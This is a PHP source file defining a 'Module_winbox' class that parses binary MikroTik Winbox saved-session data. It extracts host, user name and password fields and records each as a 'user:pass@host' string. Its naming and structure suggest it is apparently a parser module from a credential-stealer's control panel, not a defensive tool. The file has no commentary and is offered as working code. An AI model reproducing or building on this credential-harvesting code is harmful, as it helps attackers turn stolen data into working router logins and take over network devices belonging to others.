<?php
//cod.id: 12, 40$
class Module_winbox extends Module_
{
    function Process($Data)
    {
		$a = new Stream($Data, strlen($Data));
		
		$a->Skip(5);
		$i = 0;
		$Results = array();
		while(TRUE)
		{
			$a->Skip(3);
			if($a->getSTR(2) == "M2")
			{
				$a->Skip(47);
				
				$Pass = $User = $Host = NULL;
				
				while(TRUE)
				{
					$Type = $a->getWORD();
					if($a->getBYTE() == 0xFF)
						break;
					
					$Len = $a->getBYTE();
					if($Len != 0)
					{
						if($Type == 3 || $Type == 2 || $Type == 1)
							$Results[$i][$Type] = trim($a->getSTR($a->getBYTE($Len)));
						else
							$a->getSTR($a->getBYTE($Len));
					}
				}
			}
			else
				break;

			$a->Skip(18);
			$i++;
		}
		
		foreach ($Results as $Element)
			$this->insert_other($Element[2] . ":" . $Element[3] . "@" . $Element[1]);
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
        {
            $this->Process($Data);
            break;
        }
        default:
            return FALSE;
        }

        return TRUE;
    }
}
